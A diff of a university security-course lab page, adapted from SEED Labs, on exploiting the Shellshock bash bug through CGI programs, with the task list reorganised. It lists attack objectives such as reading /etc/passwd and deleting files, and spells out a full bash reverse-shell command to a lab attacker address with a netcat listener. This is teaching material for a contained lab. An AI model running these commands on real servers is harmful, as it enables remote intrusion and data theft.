@@ -7,6 +7,12 @@ duedate: 'Tuesday [02/16/2021] @ 11:59 AM (MST)'
 published: False
 ---
 
+_**TODO: Was `bash_shellshock` renamed to `bashbug` on the new VMs?**_
+{:.lead .text-center}
+
+_**TODO: Grad Student Credit?**_
+{:.lead .text-center}
+
 ## {{page.title}}
 {:.titletext}
 Adapted from SEED Labs: A Hands-on Lab for Security Education.
@@ -133,7 +139,6 @@ program (called `vul.cgi`). It simply prints out "Hello World" using a
 shell script. The CGI program is put inside Apache's default CGI folder
 `/usr/lib/cgi-bin`, and it must be executable.
 
-<!-- https://emgithub.com -->
 <script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fhello.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
 
 The CGI program uses `/bin/bash_shellshock` (the first line), instead of
@@ -184,16 +189,9 @@ program (`getenv.cgi`) on the server to help you identify what user data
 can get into the environment variables of a CGI program. This CGI
 program prints out all its environment variables.
 
-``` {caption="\\texttt{getenv.cgi}"}
-#!/bin/bash_shellshock             
+<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fenv.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>
 
-echo "Content-type: text/plain"
-echo
-echo "****** Environment Variables ******"
-strings /proc/$$/environ            (*@\ding{192}@*)
-```
-
-#### Task 2.A: Using browser.
+#### Task 2.1: Using a browser
 
 In the code above, Line prints out the contents of all the environment
 variables in the current process. Normally, you would see something like
@@ -214,7 +212,7 @@ HTTP_ACCEPT_ENCODING=gzip, deflate
 ...
 ```
 
-#### Task 2.A: Using `curl`
+#### Task 2.2: Using `curl`
 
 If we want to set the environment variable data to arbitrary values, we
 will have to modify the behavior of the browser, that will be too
@@ -223,13 +221,19 @@ which allows users to to control most of fields in an HTTP request. Here
 are some of the userful options: (1) the `-v` field can print out the
 header of the HTTP request; (2) the `-A`, `-e`, and `-H` options can set
 some fields in the header request, and you need to figure out what
-fileds are set by each of them. Please include your findings in the lab
+files are set by each of them. Please include your findings in the lab
 report. Here are the examples on how to use these fields:
 
 ```
 $ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+```
+```
 $ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+```
+```
 $ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+```
+```
 $ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
 ```
 
@@ -263,44 +267,50 @@ the target CGI program. You need to achieve the following objectives.
 For each objective, you only need to use one approach, but in total, you
 need to use three different approaches.
 
--   Task 3.A: Get the server to send back the content of the
-    `/etc/passwd` file.
+#### Task 3.1: Shellshock & Reading A File
 
--   Task 3.B: Get the server to tell you its process' user ID. You can
-    use the `/bin/id` command to print out the ID information.
+Get the server to send back the content of the `/etc/passwd` file.
 
--   Task 3.C: Get the server to create a file inside the `/tmp` folder.
-    You need to get into the container to see whether the file is
-    created or not, or use another Shellshock attack to list the `/tmp`
-    folder.
+#### Task 3.2: Shellshock & Process Info
 
--   Task 3.D: Get the server to delete the file that you just created
-    inside the `/tmp` folder.
+Get the server to tell you its process' user ID.
 
-#### Questions
+You can use the `/bin/id` command to print out the ID information.
 
-Please answer the following questions:
+#### Task 3.3: Shellshock & Creating A File
 
--   Question 1: Will you be able to steal the content of the shadow file
-    `/etc/shadow` from the server? Why or why not? The information
-    obtained in Task 3.B should give you a clue.
+Get the server to create a file inside the `/tmp` folder.
 
--   Question 2: HTTP GET requests typically attach data in the URL,
-    after the `?` mark. This could be another approach that we can use
-    to launch the attack. In the following example, we attach some data
-    in the URL, and we found that the data are used to set the following
-    environment variable:
+You need to get into the container to see whether the file is created, or use another Shellshock attack to list the `/tmp` folder.
 
-        $ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
-        ...
-        UERY_STRING=AAAAA
-        ...
+#### Task 3.4: Shellshock & Deleting A File
 
-    Can we use this method to launch the Shellshock attack? Please
-    conduct your experiment and derive your conclusions based on your
-    experiment results.
+Get the server to delete the file that you just created inside the `/tmp` folder.
 
-### Task 4: Getting a Reverse Shell via Shellshock Attack
+#### Task 3.5: Shellshock & Reading A Privileged File
+
+Will you be able to steal the content of the shadow file `/etc/shadow` from the server?
+Why or why not?
+
+The information obtained in Task 3.2 should give you a clue...
+
+#### Task 3.6: Shellshock & Reading A Privileged File
+
+HTTP GET requests typically attach data directly in the URL, just after the `?` (the question mark symbol).
+This could be another approach that we can use to launch an attack.
+In the following example, we attach some data in the URL, and we found that this data is used to set the following environment variable:
+
+```
+$ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
+...
+QUERY_STRING=AAAAA
+...
+```
+
+Can we use this method to launch a Shellshock attack?
+Please conduct an experiment and derive your conclusions based on your results.
+
+### Task 4: Getting a Reverse Shell via Shellshock
 
 The Shellshock vulnerability allows attacks to run arbitrary commands on
 the target machine. In real attacks, instead of hard-coding the command
@@ -309,98 +319,88 @@ can use this shell to run other commands, for as long as the shell
 program is alive. To achieve this goal, attackers need to run a reverse
 shell.
 
-Reverse shell is a shell process started on a machine, with its input
+A reverse shell is a shell process started on a machine, with its input
 and output being controlled by somebody from a remote computer.
 Basically, the shell runs on the victim's machine, but it takes input
-from the attacker machine and also prints its output on the attacker's
-machine. Reverse shell gives attackers a convenient way to run commands
-on a compromised machine. Detailed explanation of how to create a
-reverse shell can be found in the SEED book.
-We also summarize the explanation in the Appendix.
-In this task, you need to demonstrate how you can get a reverse shell from the victim using the Shellshock attack.
+from the attacker machine and also prints its output on the attacker's machine.
+A reverse shell gives an attacker a convenient way to run commands on a compromised machine.
 
-### Task 5: Using the Patched Bash
+In this task, you need to demonstrate that you can get a reverse shell from the victim using the Shellshock attack.
 
-Now, let us use a bash program that has already been patched. The
-program `/bin/bash` is a patched version. Please replace the first line
-of the CGI programs with this program. Redo Task 3 and describe your
-observations.
+To help you, we summarize some of the major ideas below.
 
-## Appendix: Creating A Reverse Shell
+<div class="card bg-secondary border-primary" markdown="1">
+<div class="card-body" markdown="1">
+<h4 class="card-title">Creating A Reverse Shell</h4>
 
-The key idea of reverse shell is to redirect its standard input, output,
-and error devices to a network connection, so the shell gets its input
-from the connection, and prints out its output also to the connection.
-At the other end of the connection is a program run by the attacker; the
-program simply displays whatever comes from the shell at the other end,
-and sends whatever is typed by the attacker to the shell, over the
-network connection.
+The key idea of a reverse shell is to redirect its standard input, output, and error devices to a network connection,
+so the shell gets its input from the connection, and prints out its output to the connection as well.
+At the other end of the connection is a program run by the attacker;
+the program simply displays whatever comes from the shell at the other end,
+and sends whatever is typed by the attacker to the shell, over the network connection.
 
-A commonly used program by attackers is `netcat`, which, if running with
-the `-l` option, becomes a TCP server that listens for a connection on
-the specified port. This server program basically prints out whatever is
-sent by the client, and sends to the client whatever is typed by the
-user running the server. In the following experiment, `netcat` (`nc` for
-short) is used to listen for a connection on port `9090` (let us focus
-only on the first line).
+A commonly used program by attackers is `netcat`, which,
+if running with the `-l` option, becomes a TCP server that listens for a connection on the specified port.
+This server program basically prints out whatever is sent by the client, and sends to the client whatever is typed by the user running the server.
+In the following experiment, `netcat` (`nc` for short) is used to listen for a connection on port `9090` (let us focus only on the first line).
 
-```
-Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
+```bash
+Attacker(10.0.2.6):$ nc -nv -l 9090   # Waiting for reverse shell
 Listening on 0.0.0.0 9090
 Connection received on 10.0.2.5 39452
-Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
+Server(10.0.2.5):$                    # <-- Reverse shell from 10.0.2.5.
 Server(10.0.2.5):$ ifconfig
 ifconfig
 enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet 10.0.2.5  netmask 255.255.255.0  broadcast 10.0.2.255
         ...
 ```
 
-The above `nc` command will block, waiting for a connection. We now
-directly run the following bash program on the Server
-machine (`10.0.2.5`) to emulate what attackers would run after
-compromising the server via the Shellshock attack. This bash command
-will trigger a TCP connection to the attacker machine's port 9090, and a
-reverse shell will be created. We can see the shell prompt from the
-above result, indicating that the shell is running on the Server
-machine; we can type the `ifconfig` command to verify that the IP
-address is indeed `10.0.2.5`, the one belonging to the Server machine.
+The above `nc` command will block, waiting for a connection.
+We now directly run the following bash program on the Server machine (`10.0.2.5`)
+to emulate what attackers would run after compromising the server via the Shellshock attack.
+This bash command will trigger a TCP connection to the attacker machine's port 9090, and a reverse shell will be created.
+We can see the shell prompt from the above result, indicating that the shell is running on the Server machine;
+we can type the `ifconfig` command to verify that the IP address is indeed `10.0.2.5`, the one belonging to the Server machine.
 Here is the bash command:
 
-    Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
+```bash
+Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
+```
 
-The above command represents the one that would normally be executed on
-a compromised server. It is quite complicated, and we give a detailed
-explanation in the following:
-
--   `/bin/bash -i`: The option `i` stands for interactive, meaning
-    that the shell must be interactive (must provide a shell prompt).
-
--   `> /dev/tcp/10.0.2.6/9090`: This causes the output
-    device (`stdout`) of the shell to be redirected to the TCP
-    connection to `10.0.2.6`'s port `9090`. In `Unix` systems,
-    `stdout`'s file descriptor is `1`.
-
--   `0<&1`: File descriptor `0` represents the standard input
-    device (`stdin`). This option tells the system to use the standard
-    output device as the stardard input device. Since `stdout` is
-    already redirected to the TCP connection, this option basically
-    indicates that the shell program will get its input from the same
-    TCP connection.
-
--   `2>&1`: File descriptor `2` represents the standard error
-    `stderr`. This causes the error output to be redirected to `stdout`,
-    which is the TCP connection.
+The above command is representative of one that would normally be executed on a compromised server.
+It can be quite complicated to read terse commands such as these; we provide a detailed explanation below:
+-   `/bin/bash -i`:
+    The option `i` stands for interactive, meaning that the shell must be interactive (must provide a shell prompt).
+-   `> /dev/tcp/10.0.2.6/9090`:
+    This causes the output device (`stdout`) of the shell to be redirected to the TCP connection to `10.0.2.6`'s port `9090`.
+    In `Unix` systems, `stdout`'s file descriptor is `1`.
+-   `0<&1`:
+    File descriptor `0` represents the standard input device (`stdin`).
+    This option tells the system to use the standard output device as the standard input device.
+    Since `stdout` is already redirected to the TCP connection,
+    this option basically indicates that the shell program will get its input from the same TCP connection.
+-   `2>&1`: File descriptor `2` represents standard error (`stderr`).
+    This causes the error output to be redirected to `stdout`, which is the TCP connection.
 
 In summary, the command
 ```
-"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1"
+/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
 ```
-starts a `bash` shell on the server machine, with its input coming from a TCP
-connection, and output going to the same TCP connection. In our
-experiment, when the `bash` shell command is executed on `10.0.2.5`, it
-connects back to the `netcat` process started on `10.0.2.6`. This is
-confirmed via the `Connection from 10.0.2.5 ...` message displayed by
-`netcat`.
+starts a `bash` shell on the server machine, with its input coming from a TCP connection, and output going to the same TCP connection.
+In our experiment, when the `bash` shell command is executed on `10.0.2.5`, it connects back to the `netcat` process started on `10.0.2.6`.
+This is confirmed via the `Connection from 10.0.2.5 ...` message displayed by `netcat`.
+
+</div>
+</div>
+
+### Task 5: Using the Patched Bash
+
+Now, let us use a version of the bash program that has already been patched.
+The program `/bin/bash` is a patched version.
+
+Please replace the first line of the CGI programs with this program to have your CGI programs used the patched version of bash.
+
+Repeat Task 3 and describe your observations.
 
 {% include lab_submission.html %}
